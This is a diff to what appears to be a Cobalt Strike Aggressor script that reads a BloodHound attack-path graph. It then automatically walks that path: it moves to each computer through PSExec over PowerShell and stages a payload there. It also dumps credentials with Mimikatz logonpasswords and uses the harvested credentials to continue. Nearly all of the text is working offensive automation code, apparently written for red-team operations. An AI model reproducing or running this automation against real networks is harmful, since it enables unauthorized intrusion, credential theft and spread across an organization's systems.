@@ -15,7 +15,7 @@ include(script_resource("utils.cna"));
 
 # Ordered array with attack path in format
 # @(@(%node, relationship), @(%node, relationship), @(%lastnode))
-global('@relationships @edges @nodes $waitFor $currentBid $nextLabel $attackActive $pos $listener $psexec $mimikatz');
+global('@relationships @edges @nodes @final $waitFor $currentBid $nextLabel $True $False $attackActive $pos $listener $psexec $mimikatz');
 
 sub parseNodes {
     local('$json');
@@ -149,6 +149,9 @@ sub removeGroups {
     		if ($item["type"] eq "User"){
     			$item["label"] = bhUserToCS-sub($item["label"]);
     		}
+            else {
+                $item["label"] = bhComputerToCS-sub($item["label"]);
+            }
     		push(@final, $item);
     	}
     }
@@ -160,6 +163,8 @@ sub parseGraph {
     local('$graph $json $file');
     $graph = $1;
     $file = openf($graph);
+    $True = "True";
+    $False = "False";
 
     while $line (readln($file)) {
         $json = $json . $line;
@@ -177,7 +182,9 @@ sub parseGraph {
     # Set currentBid to first node
 
     # If Start node is a computer
+
     if (@final[0]["type"] eq "Computer"){
+        println("First computer detected [!!!]");
     	$cLabel = @final[0]["label"];
     	foreach $session (beacons()) {
 			if ($cLabel eq $session["computer"]) {
@@ -186,14 +193,30 @@ sub parseGraph {
 		}
 	}
     else{
+        println("First user detected [!!!]");
     	# Start node is a user
-    	$uLabel = @final[0]["label"];
+    	$uLabel = uc(@final[0]["label"]);
+        println($uLabel);
     	foreach $session (beacons()) {
-			if ($cLabel eq $session["user"]) {
+            println($uLabel . " vs ". uc($session["user"]));
+			if ($uLabel eq uc($session["user"])) {
 				$currentBid = $session["id"];
 			}
 		}
     }
+
+    foreach @a (@final){
+        if (@a["type"] eq "Computer"){
+            println("PSEXEC to " . @a["label"]);
+        }
+        else{
+            println("Mimikatz for " . @a["label"]);
+        }
+    }
+
+    println("[*] CurrentBid is $currentBid");
+
+    $AttackActive = $False;
 
     # $currentBid is now the start node.
 
@@ -201,53 +224,54 @@ sub parseGraph {
 
     openPayloadHelper(lambda({
     	$listener = $1;
-	}));
+        $psexec = $False;
+        $mimikatz = $False;
 
-    $psexec = $False;
-    $mimikatz = $False;
+        # Reset waitFor
+        $waitFor = "";
 
-   	# Reset waitFor
-    $waitFor = "";
+        $attackActive = $True;
+        println("[*] Attack Activated");
 
-    $attackActive = $True;
-
- 	$pos = 0;
-
- 	
-
-
+        $pos = 0;
+	}, $bids => $1));
 
 }
 
-on heartbeat_1s{
+on heartbeat_5s{
 
-	if ($attackActive){
+	if ($attackActive eq $True){
+        println("[*] Executing after 5s");
 		# Ignore current node 0 as it's the first node and our machine. So loop all the way to the end.
 		$next = @final[$pos + 1];
-		$nextLabel = $next["label"];
+		$nextLabel = uc($next["label"]);
+        
 		if (@final[$pos + 1]["type"] eq "Computer"){
 			println("[LATERAL] : $nextLabel");
 			
 			#PSEXEC here
-			if ($psexec == $False){
-				bpsexec_psh($1, $nextLabel, $listener);
+			if ($psexec eq $False){
+				bpsexec_psh($currentBid, $nextLabel, $listener);
 				$psexec = $True;
+                bpause($1, 10000);
+                bstage($1, $null, $listener);
 			}
 
-
-			println("Waiting");
-		    if ($waitFor eq $nextLabel) {
+            if ($waitFor eq $nextLabel) {
 		    	# We got the beacon back and change the bid to the new one
 		    	foreach $session (beacons()) {
-					if ($nextLabel eq $session["computer"]) {
+                    $comp = $session["computer"];
+                    $note = $session["note"];
+					if (($comp eq $nextLabel) && ($note eq "ANGRYPUPPY")) {
 						$currentBid = $session["id"];
 						break;
 					}
 				}
-				if ($currentBid["computer"] eq $nextLabel){
+				if (binfo($currentBid,"computer") eq $nextLabel){
 					# All good to go
 					$pos = $pos + 1;
-					$psexec = $False;
+                    $psexec = $False;
+					
 				}
 			}
 			else if ($waitFor ne "") {
@@ -264,22 +288,29 @@ on heartbeat_1s{
 			# If all works fine, $currentBid contains the machine we are working on and should be scraping creds from
 
 			# MIMIKATZ HERE
+			
+            println("Mimikatz: " . $mimikatz);
+            println("Wait For: " . $waitFor);
+            println("Next Label: " . $nextLabel);
 
-			if ($Mimikatz = $False){
-				blogonpasswords($1);
-				$Mimikatz = $True;
+            if ($mimikatz eq $False) {
+                blogonpasswords($currentBid);
+				$mimikatz = $True;
+                $waitFor = "";
+                bpause($1, 10000);
 			}
 
-			if ($waitFor eq $nextLabel) {
+            if ($waitFor eq $nextLabel) {
 				# We got the set of credentials we need in the cred store, we want to grab it out now.
 				foreach $cred (credentials()){
+                    println("Comparing " . $cred["user"] . " vs. " . $nextLabel);
 					if ($nextLabel eq $cred["user"]){
 						# Current $Cred object 
 						$targetCreds = $cred;
 						break;
 					}
 				}
-				if ($targetCreds["user"] eq $nextLabel){
+				if (uc($targetCreds["user"]) eq $nextLabel){
 					# All good to go
 					$pos = $pos + 1;
 					$mimikatz = $False;
@@ -289,11 +320,11 @@ on heartbeat_1s{
 				}
 			}
 			else if ($waitFor ne "") {
-				$waitFor = "";
 				println("Error: WaitFor override with wrong credentials");
+                println($waitFor . " vs. " . $nextLabel);
 			}
 		}
-		if ($pos = size(@final)){
+		if ($pos eq size(@final)){
 			# Finished attack path
 
 			println("[*] Attack finished");
